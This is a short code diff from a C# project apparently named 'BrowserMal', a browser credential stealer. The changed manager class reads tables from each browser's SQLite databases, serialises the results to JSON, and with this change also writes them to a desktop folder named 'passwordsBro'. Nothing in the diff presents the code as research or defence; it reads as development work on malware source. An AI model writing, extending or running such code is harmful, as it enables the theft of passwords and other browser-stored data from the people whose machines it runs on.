@@ -1,5 +1,4 @@
 ﻿using BrowserMal.Browser;
-using BrowserMal.Filesaver;
 using BrowserMal.Util;
 using System;
 using System.Collections.Generic;
@@ -37,7 +36,8 @@ namespace BrowserMal.Manager
                     if (result.Count == 0)
                         continue;
 
-                    _resultList.Add($"{browser.Name}_{GetTableName}.json", JsonUtil.GetJson<T>(result));
+                    _resultList.Add($"{browser.Name}_{_tableName}.json", JsonUtil.GetJson<T>(result));
+                    Filesaver.FileManager.Save<T>(result, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_{_tableName}.json");
                 }
 
                 return _resultList;
@@ -68,7 +68,7 @@ namespace BrowserMal.Manager
             List<T> generic = new List<T>();
 
             SqliteHandler sqLiteHandler = new SqliteHandler(path);
-            sqLiteHandler.ReadTable(GetTableName);
+            sqLiteHandler.ReadTable(_tableName);
 
             for (int i = 0; i <= sqLiteHandler.GetRowCount() - 1; i++)
             {
